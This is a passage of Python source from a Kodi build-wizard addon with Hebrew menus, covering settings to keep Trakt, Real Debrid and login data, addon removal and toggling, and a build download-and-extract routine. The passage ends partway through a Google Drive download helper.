	rd2        = 'true' if KEEPRD2       == 'true' else 'false'
	keeptornet = 'true' if KEEPTORNET    == 'true' else 'true'
	login      = 'true' if KEEPLOGIN     == 'true' else 'false'
	sources    = 'true' if KEEPSOURCES   == 'true' else 'false'
	advanced   = 'true' if KEEPADVANCED  == 'true' else 'false'
	profiles   = 'true' if KEEPPROFILES  == 'true' else 'false'
	favourites = 'true' if KEEPFAVS      == 'true' else 'false'
	repos      = 'true' if KEEPREPOS     == 'true' else 'false'
	super      = 'true' if KEEPSUPER     == 'true' else 'false'
	whitelist  = 'true' if KEEPWHITELIST == 'true' else 'false'
	weather    = 'true' if KEEPWEATHER   == 'true' else 'false'
	victory    = 'true' if KEEPVICTORY   == 'true' else 'false'
	telemedia  = 'true' if KEEPTELEMEDIA   == 'true' else 'false'
	# addFile('אפשרויות שמירה קודי אנונימוס', '', themeit=THEME3)
	if whitelist == 'true':
		addFile('בחר הרחבות לשמירה',        'whitelist', 'edit',   icon=ICONSAVE,  themeit=THEME1)
		addFile('רשימת ההרחבות שבחרתי לשמור',        'whitelist', 'view',   icon=ICONSAVE,  themeit=THEME1)
		addFile('נקה רשימת הרחבות',       'whitelist', 'clear',  icon=ICONSAVE,  themeit=THEME1)
		addFile('יבה רשימת הרחבות',      'whitelist', 'import', icon=ICONSAVE,  themeit=THEME1)
		addFile('יצא רשימת הרחבות',      'whitelist', 'export', icon=ICONSAVE,  themeit=THEME1)
	# addFile('%s התקנת קיר סרטים: ' % wall.replace('true',on).replace('false',off)                   ,'togglesetting',
	# 'keepmoviewall',    icon=ICONTRAKT, themeit=THEME1)
	addFile('%s שמירת חשבון RD:  ' % real.replace('true',on).replace('false',off)                  ,'togglesetting', 'keepdebrid',     icon=ICONREAL,  themeit=THEME1)
	addFile('%s שמירת חשבון טראקט:  ' % trakt.replace('true',on).replace('false',off), 'togglesetting', 'keeptrakt', icon=ICONTRAKT, themeit=THEME1)
	#addFile('Save Login Data: %s' % login, 'togglesetting', 'keeplogin', icon=ICONLOGIN, themeit=THEME3)
	#addFile('%s שמירת חשבון RD להרחבה גאיה וסרן: ' % rd2.replace('true',on).replace('false',off)                  ,'togglesetting', 'keeprd2',     icon=ICONREAL,  themeit=THEME1)
	addFile('%s שמירת מועדפים:  ' % favourites.replace('true',on).replace('false',off)     ,'togglesetting', 'keepfavourites', icon=ICONSAVE,  themeit=THEME1)
	addFile('%s שמירת לקוח טלוויזיה:  ' % pvr.replace('true',on).replace('false',off)               ,'togglesetting', 'keeppvr',    icon=ICONTRAKT, themeit=THEME1)
	addFile('%s שמירת הגדרות הרחבה ויקטורי:  ' % victory.replace('true',on).replace('false',off)               ,'togglesetting', 'keepvictory',    icon=ICONTRAKT, themeit=THEME1)
	addFile('%s שמירת חשבון טלמדיה:  ' % telemedia.replace('true',on).replace('false',off)               ,'togglesetting', 'keeptelemedia',    icon=ICONTRAKT, themeit=THEME1)
	addFile('%s שמירת רשימת עורצי טלוויזיה:  ' % tvlist.replace('true',on).replace('false',off)               ,'togglesetting', 'keeptvlist',    icon=ICONTRAKT, themeit=THEME1)
	addFile('%s שמירת אריח סרטים:  ' % hubmovie.replace('true',on).replace('false',off)               ,'togglesetting', 'keephubmovie',    icon=ICONTRAKT, themeit=THEME1)
	addFile('%s שמירת אריח סדרות:  ' % hubtvshow.replace('true',on).replace('false',off)               ,'togglesetting', 'keephubtvshow',    icon=ICONTRAKT, themeit=THEME1)
	addFile('%s שמירת אריח טלויזיה:  ' % hubtv.replace('true',on).replace('false',off)               ,'togglesetting', 'keephubtv',    icon=ICONTRAKT, themeit=THEME1)
	addFile('%s שמירת אריח תוכן ישראלי:  ' % hubvod.replace('true',on).replace('false',off)               ,'togglesetting', 'keephubvod',    icon=ICONTRAKT, themeit=THEME1)
	addFile('%s שמירת אריח ספורט:  ' % hubsport.replace('true',on).replace('false',off)               ,'togglesetting', 'keephubvod',    icon=ICONTRAKT, themeit=THEME1)
	addFile('%s שמירת אריח ילדים:  ' % hubkids.replace('true',on).replace('false',off)               ,'togglesetting', 'keephubkids',    icon=ICONTRAKT, themeit=THEME1)
	addFile('%s שמירת אריח מוסיקה:  ' % hubmusic.replace('true',on).replace('false',off)               ,'togglesetting', 'keephubmusic',    icon=ICONTRAKT, themeit=THEME1)
	addFile('%s שמירת תפריט אריחים ראשי:  ' % hubmenu.replace('true',on).replace('false',off)               ,'togglesetting', 'keephubmenu',    icon=ICONTRAKT, themeit=THEME1)
	addFile('%s שמירת כל האריחים בסקין:  ' % skin.replace('true',on).replace('false',off)               ,'togglesetting', 'keepskin',    icon=ICONTRAKT, themeit=THEME1)
	addFile('%s שמירת הגדרות מזג האוויר:  ' % weather.replace('true',on).replace('false',off)               ,'togglesetting', 'keepweather',    icon=ICONTRAKT, themeit=THEME1)
	
	#addFile('%s התקנת סקין פנומנל: ' % skin2.replace('true',on).replace('false',off)                   ,'togglesetting',
	#'keepskin2',    icon=ICONTRAKT, themeit=THEME1)
	#addFile('%s התקנת סקין טיטאן: ' % skin3.replace('true',on).replace('false',off)                   ,'togglesetting',
	#'keepskin3',    icon=ICONTRAKT, themeit=THEME1)
	addFile('%s שמירת הרחבות שהתקנתי:  ' % addons.replace('true',on).replace('false',off)               ,'togglesetting', 'keepaddons',    icon=ICONTRAKT, themeit=THEME1)
	addFile('%s שמירת חשבון סדרות Tv ו Apollo Group:  ' % info.replace('true',on).replace('false',off)               ,'togglesetting', 'keepinfo',    icon=ICONTRAKT, themeit=THEME1)
	#addFile('%s שמירת תמונות שירדו: ' % thumb.replace('true',on).replace('false',off)               ,'togglesetting', 'keepthumbnails',    icon=ICONTRAKT, themeit=THEME1)
	addFile('%s שמירת ספריית סרטים וסדרות:  ' % list.replace('true',on).replace('false',off)                   ,'togglesetting',
	'keepmovielist',    icon=ICONTRAKT, themeit=THEME1)
	addFile('%s שמירת נתיבי ספריות וידאו:  ' % sources.replace('true',on).replace('false',off)           ,'togglesetting', 'keepsources',    icon=ICONSAVE,  themeit=THEME1)
	addFile('%s שמירת הגדרות סאונד ורזולוציה:  ' % sound.replace('true',on).replace('false',off)               ,'togglesetting', 'keepsound',    icon=ICONTRAKT, themeit=THEME1)
	#addFile('%s שמירת הרחבות טורונטים: ' % tornet.replace('true',on).replace('false',off)               ,'togglesetting', 'keeptornet',    icon=ICONTRAKT, themeit=THEME1)
	addFile('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : ' % view.replace('true',on).replace('false',off)               ,'togglesetting', 'keepview',    icon=ICONTRAKT, themeit=THEME1)
	addFile('%s שמירת פליליסט לאודר:  ' % plist.replace('true',on).replace('false',off)               ,'togglesetting', 'keepplaylist',    icon=ICONTRAKT, themeit=THEME1)
	# addFile('%s שמירת הרחבות ידנית: ' % whitelist.replace('true',on).replace('false',off)        ,'togglesetting', 'keepwhitelist',  icon=ICONSAVE,  themeit=THEME1)
	#addFile('%s שמירת חשבון טראקט: ' % trakt.replace('true',on).replace('false',off)                       ,'togglesetting', 'keeptrakt',      icon=ICONTRAKT, themeit=THEME1)
	#addFile('%s שמירת הגדרות כניסה: ' % login.replace('true',on).replace('false',off)                  ,'togglesetting', 'keeplogin',      icon=ICONLOGIN, themeit=THEME1)
	#addFile('%s שמירת פרופילים: '  % profiles.replace('true',on).replace('false',off)         ,'togglesetting', 'keepprofiles',   icon=ICONSAVE,  themeit=THEME1)
	addFile('%s שמירת הגדרות באפר: ' % advanced.replace('true',on).replace('false',off) ,'togglesetting', 'keepadvanced',   icon=ICONSAVE,  themeit=THEME1)
	# addFile('%s שמירת סופר מועדפים: ' % super.replace('true',on).replace('false',off)            ,'togglesetting', 'keepsuper',      icon=ICONSAVE,  themeit=THEME1)
	addFile('%s שמירת רשימות ריפו:  ' % repos.replace('true',on).replace('false',off)           ,'togglesetting', 'keeprepos',      icon=ICONSAVE,  themeit=THEME1)

	setView('files', 'viewType')

def traktMenu():
	trakt = '[COLOR green]מופעל[/COLOR]' if KEEPTRAKT == 'true' else '[COLOR red]מבוטל[/COLOR]'
	last = str(TRAKTSAVE) if not TRAKTSAVE == '' else 'Trakt hasnt been saved yet.'
	addFile('[I]Register FREE Account at http://trakt.tv[/I]', '', icon=ICONTRAKT, themeit=THEME3)
	addFile('Save Trakt Data: %s' % trakt, 'togglesetting', 'keeptrakt', icon=ICONTRAKT, themeit=THEME3)
	if KEEPTRAKT == 'true': addFile('Last Save: %s' % str(last), '', icon=ICONTRAKT, themeit=THEME3)
	if HIDESPACERS == 'No': addFile(wiz.sep(), '', icon=ICONTRAKT, themeit=THEME3)
	
	for trakt in traktit.ORDER:
		name   = TRAKTID[trakt]['name']
		path   = TRAKTID[trakt]['path']
		saved  = TRAKTID[trakt]['saved']
		file   = TRAKTID[trakt]['file']
		user   = wiz.getS(saved)
		auser  = traktit.traktUser(trakt)
		icon   = TRAKTID[trakt]['icon']   if os.path.exists(path) else ICONTRAKT
		fanart = TRAKTID[trakt]['fanart'] if os.path.exists(path) else FANART
		menu = createMenu('saveaddon', 'Trakt', trakt)
		menu2 = createMenu('save', 'Trakt', trakt)
		menu.append((THEME2 % '%s Settings' % name,              'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)' %   (ADDON_ID, trakt)))
		
		addFile('[+]-> %s' % name,     '', icon=icon, fanart=fanart, themeit=THEME3)
		if not os.path.exists(path): addFile('[COLOR red]Addon Data: Not Installed[/COLOR]', '', icon=icon, fanart=fanart, menu=menu)
		elif not auser:              addFile('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt', trakt, icon=icon, fanart=fanart, menu=menu)
		else:                        addFile('[COLOR green]Addon Data: %s[/COLOR]' % auser,'authtrakt', trakt, icon=icon, fanart=fanart, menu=menu)
		if user == "":
			if os.path.exists(file): addFile('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt', trakt, icon=icon, fanart=fanart, menu=menu2)
			else :                   addFile('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt', trakt, icon=icon, fanart=fanart, menu=menu2)
		else:                        addFile('[COLOR green]Saved Data: %s[/COLOR]' % user, '', icon=icon, fanart=fanart, menu=menu2)
	
	if HIDESPACERS == 'No': addFile(wiz.sep(), '', themeit=THEME3)
	addFile('Save All Trakt Data',          'savetrakt',    'all', icon=ICONTRAKT,  themeit=THEME3)
	addFile('Recover All Saved Trakt Data', 'restoretrakt', 'all', icon=ICONTRAKT,  themeit=THEME3)
	addFile('Import Trakt Data',            'importtrakt',  'all', icon=ICONTRAKT,  themeit=THEME3)
	addFile('Clear All Saved Trakt Data',   'cleartrakt',   'all', icon=ICONTRAKT,  themeit=THEME3)
	addFile('Clear All Addon Data',         'addontrakt',   'all', icon=ICONTRAKT,  themeit=THEME3)
	setView('files', 'viewType')

def realMenu():
	real = '[COLOR green]ON[/COLOR]' if KEEPREAL == 'true' else '[COLOR red]OFF[/COLOR]'
	last = str(REALSAVE) if not REALSAVE == '' else 'Real Debrid hasnt been saved yet.'
	addFile('[I]http://real-debrid.com is a PAID service.[/I]', '', icon=ICONREAL, themeit=THEME3)
	addFile('Save Real Debrid Data: %s' % real, 'togglesetting', 'keepdebrid', icon=ICONREAL, themeit=THEME3)
	if KEEPREAL == 'true': addFile('Last Save: %s' % str(last), '', icon=ICONREAL, themeit=THEME3)
	if HIDESPACERS == 'No': addFile(wiz.sep(), '', icon=ICONREAL, themeit=THEME3)
	
	for debrid in debridit.ORDER:
		name   = DEBRIDID[debrid]['name']
		path   = DEBRIDID[debrid]['path']
		saved  = DEBRIDID[debrid]['saved']
		file   = DEBRIDID[debrid]['file']
		user   = wiz.getS(saved)
		auser  = debridit.debridUser(debrid)
		icon   = DEBRIDID[debrid]['icon']   if os.path.exists(path) else ICONREAL
		fanart = DEBRIDID[debrid]['fanart'] if os.path.exists(path) else FANART
		menu = createMenu('saveaddon', 'Debrid', debrid)
		menu2 = createMenu('save', 'Debrid', debrid)
		menu.append((THEME2 % '%s Settings' % name,              'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)' %   (ADDON_ID, debrid)))
		
		addFile('[+]-> %s' % name,     '', icon=icon, fanart=fanart, themeit=THEME3)
		if not os.path.exists(path): addFile('[COLOR red]Addon Data: Not Installed[/COLOR]', '', icon=icon, fanart=fanart, menu=menu)
		elif not auser:              addFile('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid', debrid, icon=icon, fanart=fanart, menu=menu)
		else:                        addFile('[COLOR green]Addon Data: %s[/COLOR]' % auser,'authdebrid', debrid, icon=icon, fanart=fanart, menu=menu)
		if user == "":
			if os.path.exists(file): addFile('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid', debrid, icon=icon, fanart=fanart, menu=menu2)
			else :                   addFile('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid', debrid, icon=icon, fanart=fanart, menu=menu2)
		else:                        addFile('[COLOR green]Saved Data: %s[/COLOR]' % user, '', icon=icon, fanart=fanart, menu=menu2)
	
	if HIDESPACERS == 'No': addFile(wiz.sep(), '', themeit=THEME3)
	addFile('Save All Real Debrid Data',          'savedebrid',    'all', icon=ICONREAL,  themeit=THEME3)
	addFile('Recover All Saved Real Debrid Data', 'restoredebrid', 'all', icon=ICONREAL,  themeit=THEME3)
	addFile('Import Real Debrid Data',            'importdebrid',  'all', icon=ICONREAL,  themeit=THEME3)
	addFile('Clear All Saved Real Debrid Data',   'cleardebrid',   'all', icon=ICONREAL,  themeit=THEME3)
	addFile('Clear All Addon Data',               'addondebrid',   'all', icon=ICONREAL,  themeit=THEME3)
	setView('files', 'viewType')

def loginMenu():
	login = '[COLOR green]ON[/COLOR]' if KEEPLOGIN == 'true' else '[COLOR red]OFF[/COLOR]'
	last = str(LOGINSAVE) if not LOGINSAVE == '' else 'Login data hasnt been saved yet.'
	addFile('[I]Several of these addons are PAID services.[/I]', '', icon=ICONLOGIN, themeit=THEME3)
	addFile('Save Login Data: %s' % login, 'togglesetting', 'keeplogin', icon=ICONLOGIN, themeit=THEME3)
	if KEEPLOGIN == 'true': addFile('Last Save: %s' % str(last), '', icon=ICONLOGIN, themeit=THEME3)
	if HIDESPACERS == 'No': addFile(wiz.sep(), '', icon=ICONLOGIN, themeit=THEME3)

	for login in loginit.ORDER:
		name   = LOGINID[login]['name']
		path   = LOGINID[login]['path']
		saved  = LOGINID[login]['saved']
		file   = LOGINID[login]['file']
		user   = wiz.getS(saved)
		auser  = loginit.loginUser(login)
		icon   = LOGINID[login]['icon']   if os.path.exists(path) else ICONLOGIN
		fanart = LOGINID[login]['fanart'] if os.path.exists(path) else FANART
		menu = createMenu('saveaddon', 'Login', login)
		menu2 = createMenu('save', 'Login', login)
		menu.append((THEME2 % '%s Settings' % name,              'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)' %   (ADDON_ID, login)))
		
		addFile('[+]-> %s' % name,     '', icon=icon, fanart=fanart, themeit=THEME3)
		if not os.path.exists(path): addFile('[COLOR red]Addon Data: Not Installed[/COLOR]', '', icon=icon, fanart=fanart, menu=menu)
		elif not auser:              addFile('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin', login, icon=icon, fanart=fanart, menu=menu)
		else:                        addFile('[COLOR green]Addon Data: %s[/COLOR]' % auser,'authlogin', login, icon=icon, fanart=fanart, menu=menu)
		if user == "":
			if os.path.exists(file): addFile('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin', login, icon=icon, fanart=fanart, menu=menu2)
			else :                   addFile('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin', login, icon=icon, fanart=fanart, menu=menu2)
		else:                        addFile('[COLOR green]Saved Data: %s[/COLOR]' % user, '', icon=icon, fanart=fanart, menu=menu2)

	if HIDESPACERS == 'No': addFile(wiz.sep(), '', themeit=THEME3)
	addFile('Save All Login Data',          'savelogin',    'all', icon=ICONLOGIN,  themeit=THEME3)
	addFile('Recover All Saved Login Data', 'restorelogin', 'all', icon=ICONLOGIN,  themeit=THEME3)
	addFile('Import Login Data',            'importlogin',  'all', icon=ICONLOGIN,  themeit=THEME3)
	addFile('Clear All Saved Login Data',   'clearlogin',   'all', icon=ICONLOGIN,  themeit=THEME3)
	addFile('Clear All Addon Data',         'addonlogin',   'all', icon=ICONLOGIN,  themeit=THEME3)
	setView('files', 'viewType')

def fixUpdate():
	if KODIV < 17: 
		dbfile = os.path.join(DATABASE, wiz.latestDB('Addons'))
		try:
			os.remove(dbfile)
		except Exception as e:
			wiz.log("Unable to remove %s, Purging DB" % dbfile)
			wiz.purgeDb(dbfile)
	else:
		xbmc.log("Requested Addons.db be removed but doesnt work in Kod17")

def removeAddonMenu():
	fold = glob.glob(os.path.join(ADDONS, '*/'))
	addonnames = []; addonids = []
	for folder in sorted(fold, key = lambda x: x):
		foldername = os.path.split(folder[:-1])[1]
		if foldername in EXCLUDES: continue
		elif foldername in DEFAULTPLUGINS: continue
		elif foldername == 'packages': continue
		xml = os.path.join(folder, 'addon.xml')
		if os.path.exists(xml):
			f      = open(xml)
			a      = f.read()
			match  = wiz.parseDOM(a, 'addon', ret='id')

			addid  = foldername if len(match) == 0 else match[0]
			try: 
				add = xbmcaddon.Addon(id=addid)
				addonnames.append(add.getAddonInfo('name'))
				addonids.append(addid)
			except:
				pass
	if len(addonnames) == 0:
		wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]No Addons To Remove[/COLOR]" % COLOR2)
		return
	if KODIV > 16:
		selected = DIALOG.multiselect("%s: Select the addons you wish to remove." % ADDONTITLE, addonnames)
	else:
		selected = []; choice = 0
		tempaddonnames = ["-- Click here to Continue --"] + addonnames
		while not choice == -1:
			choice = DIALOG.select("%s: Select the addons you wish to remove." % ADDONTITLE, tempaddonnames)
			if choice == -1: break
			elif choice == 0: break
			else: 
				choice2 = (choice-1)
				if choice2 in selected:
					selected.remove(choice2)
					tempaddonnames[choice] = addonnames[choice2]
				else:
					selected.append(choice2)
					tempaddonnames[choice] = "[B][COLOR %s]%s[/COLOR][/B]" % (COLOR1, addonnames[choice2])
	if selected == None: return
	if len(selected) > 0:
		wiz.addonUpdates('set')
		for addon in selected:
			removeAddon(addonids[addon], addonnames[addon], True)

		xbmc.sleep(1000)
		
		if INSTALLMETHOD == 1: todo = 1
		elif INSTALLMETHOD == 2: todo = 0
		else: todo = DIALOG.yesno(ADDONTITLE, "[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]" % (COLOR2, COLOR1, COLOR1), yeslabel="[B][COLOR green]הצג נתונים[/COLOR][/B]", nolabel="[B][COLOR red]סגירה[/COLOR][/B]")
		if todo == 1: wiz.reloadFix('remove addon')
		else: wiz.addonUpdates('reset'); wiz.killxbmc(True)

def removeAddonDataMenu():
	if os.path.exists(ADDOND):
		addFile('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data', 'removedata', 'all', themeit=THEME2)
		addFile('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons', 'removedata', 'uninstalled', themeit=THEME2)
		addFile('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data', 'removedata', 'empty', themeit=THEME2)
		addFile('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data' % ADDONTITLE, 'resetaddon', themeit=THEME2)
		if HIDESPACERS == 'No': addFile(wiz.sep(), '', themeit=THEME3)
		fold = glob.glob(os.path.join(ADDOND, '*/'))
		for folder in sorted(fold, key = lambda x: x):
			foldername = folder.replace(ADDOND, '').replace('\\', '').replace('/', '')
			icon = os.path.join(folder.replace(ADDOND, ADDONS), 'icon.png')
			fanart = os.path.join(folder.replace(ADDOND, ADDONS), 'fanart.png')
			folderdisplay = foldername
			replace = {'audio.':'[COLOR orange][AUDIO] [/COLOR]', 'metadata.':'[COLOR cyan][METADATA] [/COLOR]', 'module.':'[COLOR orange][MODULE] [/COLOR]', 'plugin.':'[COLOR blue][PLUGIN] [/COLOR]', 'program.':'[COLOR orange][PROGRAM] [/COLOR]', 'repository.':'[COLOR gold][REPO] [/COLOR]', 'script.':'[COLOR green][SCRIPT] [/COLOR]', 'service.':'[COLOR green][SERVICE] [/COLOR]', 'skin.':'[COLOR dodgerblue][SKIN] [/COLOR]', 'video.':'[COLOR orange][VIDEO] [/COLOR]', 'weather.':'[COLOR yellow][WEATHER] [/COLOR]'}
			for rep in replace:
				folderdisplay = folderdisplay.replace(rep, replace[rep])
			if foldername in EXCLUDES: folderdisplay = '[COLOR green][B][PROTECTED][/B][/COLOR] %s' % folderdisplay
			else: folderdisplay = '[COLOR red][B][REMOVE][/B][/COLOR] %s' % folderdisplay
			addFile(' %s' % folderdisplay, 'removedata', foldername, icon=icon, fanart=fanart, themeit=THEME2)
	else:
		addFile('No Addon data folder found.', '', themeit=THEME3)
	setView('files', 'viewType')

def enableAddons():
	addFile("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]", '', icon=ICONMAINT)
	fold = glob.glob(os.path.join(ADDONS, '*/'))
	x = 0
	for folder in sorted(fold, key = lambda x: x):
		foldername = os.path.split(folder[:-1])[1]
		if foldername in EXCLUDES: continue
		if foldername in DEFAULTPLUGINS: continue
		addonxml = os.path.join(folder, 'addon.xml')
		if os.path.exists(addonxml):
			x += 1
			fold   = folder.replace(ADDONS, '')[1:-1]
			f      = open(addonxml)
			a      = f.read().replace('\n','').replace('\r','').replace('\t','')
			match  = wiz.parseDOM(a, 'addon', ret='id')
			match2 = wiz.parseDOM(a, 'addon', ret='name')
			try:
				pluginid = match[0]
				name = match2[0]
			except:
				continue
			try:
				add    = xbmcaddon.Addon(id=pluginid)
				state  = "[COLOR green][Enabled][/COLOR]"
				goto   = "false"
			except:
				state  = "[COLOR red][Disabled][/COLOR]"
				goto   = "true"
				pass
			icon   = os.path.join(folder, 'icon.png') if os.path.exists(os.path.join(folder, 'icon.png')) else ICON
			fanart = os.path.join(folder, 'fanart.jpg') if os.path.exists(os.path.join(folder, 'fanart.jpg')) else FANART
			addFile("%s %s" % (state, name), 'toggleaddon', fold, goto, icon=icon, fanart=fanart)
			f.close()
	if x == 0:
		addFile("No Addons Found to Enable or Disable.", '', icon=ICONMAINT)
	setView('files', 'viewType')

def changeFeq():
	feq        = ['Every Startup', 'Every Day', 'Every Three Days', 'Every Weekly']
	change     = DIALOG.select("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]" % COLOR2, feq)
	if not change == -1: 
		wiz.setS('autocleanfeq', str(change))
		wiz.LogNotify('[COLOR %s]Auto Clean Up[/COLOR]' % COLOR1, '[COLOR %s]Fequency Now %s[/COLOR]' % (COLOR2, feq[change]))

def developer():
	addFile('Convert Text Files to 0.1.7',         'converttext',           themeit=THEME1)
	addFile('Create QR Code',                      'createqr',              themeit=THEME1)
	addFile('Test Notifications',                  'testnotify',            themeit=THEME1)
	addFile('Test Update',                         'testupdate',            themeit=THEME1)
	addFile('Test First Run',                      'testfirst',             themeit=THEME1)
	addFile('Test First Run Settings',             'testfirstrun',          themeit=THEME1)
	addFile('Test APk',             'testapk',          themeit=THEME1)
	
	setView('files', 'viewType')

###########################
###### Build Install ######
###########################
def download(link,dest):
  iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
  iiiI11 = xbmcgui . DialogProgress ( )
  iiiI11 . create ( "XBMC ISRAEL" , "Downloading " +name, '' , 'Please Wait' )
  OOooO = os . path . join ( iiI1iIiI , 'isr.zip' )
  req = urllib2.Request(link)
  remote_file = urllib2.urlopen(req)
  #the_page = response.read()
  dp = xbmcgui.DialogProgress()
  dp.create("Downloading", "Downloading " +name)
  dp.update(0)
  images_file=dest
  f = open(OOooO, 'wb')

  try:
    total_size = remote_file.info().getheader('Content-Length').strip()
    header = True
  except AttributeError:
        header = False # a response doesn't always include the "Content-Length" header

  if header:
        total_size = int(total_size)

  bytes_so_far = 0
  start_time=time.time()
  while True:
        buffer = remote_file.read(8192)
        if not buffer:
            sys.stdout.write('\n')
            break

        bytes_so_far += len(buffer)
        f.write(buffer)

        if not header:
            total_size = bytes_so_far # unknown size
        if dp.iscanceled(): 
           dp.close()
           try:
            os.remove(OOooO)
           except:
            pass
           break
        percent = float(bytes_so_far) / total_size
        percent = round(percent*100, 2)
        currently_downloaded=bytes_so_far/ (1024 * 1024) 
        total=total_size/ (1024 * 1024) 
        mbs = '[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]' % ('teal', 'skyblue', currently_downloaded, 'teal', total) 
        if (time.time() - start_time) >0:
          kbps_speed = bytes_so_far / (time.time() - start_time) 
          kbps_speed = kbps_speed / 1024 
        else:
         kbps_speed=0
        type_speed = 'KB'
        if kbps_speed >= 1024:
           kbps_speed = kbps_speed / 1024 
           type_speed = 'MB'
        if kbps_speed > 0 and not percent == 100: 
            eta = (total_size - bytes_so_far) / kbps_speed 
        else: 
            eta = 0
        e   = '[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s ' % ('teal', 'skyblue', kbps_speed, type_speed)

        dp.update(int(percent), "Downloading " +name,mbs,e )
        #sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))
  
  II111iiii = xbmc . translatePath ( os . path . join ( 'special://home' , 'addons' ) )
     
  f.close()

  extract  ( OOooO , II111iiii,dp )
  if os.path.exists(II111iiii+'/scakemyer-script.quasar.burst'):
    if os.path.exists(II111iiii+'/script.quasar.burst'):
     shutil.rmtree(II111iiii+'/script.quasar.burst' , ignore_errors=False)
    os.rename(II111iiii+'/scakemyer-script.quasar.burst',II111iiii+'/script.quasar.burst')
    
  if os.path.exists(II111iiii+'/plugin.video.kmediatorrent-master'):
    if os.path.exists(II111iiii+'/plugin.video.kmediatorrent'):
     shutil.rmtree(II111iiii+'/plugin.video.kmediatorrent' , ignore_errors=False)
    os.rename(II111iiii+'/plugin.video.kmediatorrent-master',II111iiii+'/plugin.video.kmediatorrent')
  xbmc . executebuiltin ( 'UpdateLocalAddons ' )
  xbmc . executebuiltin ( "UpdateAddonRepos" )
  try:
    os.remove(OOooO)
  except:
    pass
  dp.close()
def dis_or_enable_addon(addon_id,mode, enable="true"):
    import json
    addon = '"%s"' % addon_id
    if xbmc.getCondVisibility("System.HasAddon(%s)" % addon_id) and enable == "true":
        logging.warning('already Enabled')
        return xbmc.log("### Skipped %s, reason = allready enabled" % addon_id)
    elif not xbmc.getCondVisibility("System.HasAddon(%s)" % addon_id) and enable == "false":
        return xbmc.log("### Skipped %s, reason = not installed" % addon_id)
    else:
        do_json = '{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}' % (addon, enable)
        query = xbmc.executeJSONRPC(do_json)
        response = json.loads(query)
        if enable == "true":
            xbmc.log("### Enabled %s, response = %s" % (addon_id, response))
        else:
            xbmc.log("### Disabled %s, response = %s" % (addon_id, response))
    if mode=='auto':
     return True
    return xbmc.executebuiltin('Container.Update(%s)' % xbmc.getInfoLabel('Container.FolderPath'))
def chunk_report(bytes_so_far, chunk_size, total_size):
   percent = float(bytes_so_far) / total_size
   percent = round(percent*100, 2)

   if bytes_so_far >= total_size:
      sys.stdout.write('\n')

def chunk_read(response, chunk_size=8192, report_hook=None,dp=None,destination='',filesize=1000000):
   import time
   total_size = int(filesize)*1000000

   bytes_so_far = 0
   start_time = time.time()
   count=0
   zxz = '[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]' % (COLOR2, COLOR1, name, wiz.checkBuild(name,'version'))
   logging.warning('Downloading')
   with open(destination, "wb") as f:
    while 1:
      duration = time.time() - start_time
      progress_size = int(count * chunk_size)
      chunk = response.read(chunk_size)
      f.write(chunk)
      f.flush()
      bytes_so_far += len(chunk)
      percent = float(bytes_so_far) / total_size
      percent = round(percent*100, 2)
      if int(duration)>0: 
        speed = int(progress_size / (1024 * duration))
      else:
         speed=0
      if speed > 1024 and not percent == 100:
          eta =int(( (total_size - progress_size)/1024) / (speed) )
      else:
          eta=0
      if eta<0:
        eta=0

      dp.update(int(percent),zxz + "[B]מוריד: [/B]", "\r%d%%,[COLOR yellow] %d MB / %d MB [/COLOR], %d KB/s " %(percent, progress_size / (1024 * 1024),total_size/(1000 * 1000), speed), '[COLOR yellow]%02d:%02d[/COLOR][B]זמן שנותר: [/B]' % divmod(eta, 60))
      if dp.iscanceled():
         dp.close()
         break
      if not chunk:
         break

      if report_hook:
         report_hook(bytes_so_far, chunk_size, total_size)
      count += 1
   logging.warning('END Downloading')
   return bytes_so_far
   
def googledrive_download(id, destination,dp,filesize):
    #download('http://mirrors.kodi.tv/addons/jarvis/script.module.requests/script.module.requests-2.9.1.zip','script.module.requests')
    #dis_or_enable_addon('script.module.requests','auto')
    #import requests,time
    keys=[]
    id_pre=id.split('=')
    id=id_pre[len(id_pre)-1]

    def get_confirm_token(response):
        
        for cookie in response:
            logging.warning('cookie.name')
            logging.warning(cookie.name)
            backup_cookie= cookie.value
            if 'download_warning' in cookie.name:
                logging.warning(cookie.value)
                logging.warning('cookie.value')
                return cookie.value
            return backup_cookie

        return None

    def save_response_content(response, destination):
        
        CHUNK_SIZE = 32768
        start_time = time.time()
     
        with open(destination, "wb") as f:
            count = 1
            block_size = 32768
            try:
                total_size = int(response.headers.get('content-length'))
                print ('file total size :',total_size)
            except TypeError:
                print ('using dummy length !!!')
                total_size = int(filesize)*1000000
            for chunk in response.iter_content(CHUNK_SIZE):
                if chunk: # filter out keep-alive new chunks
                    f.write(chunk)
                    f.flush()
                    duration = time.time() - start_time
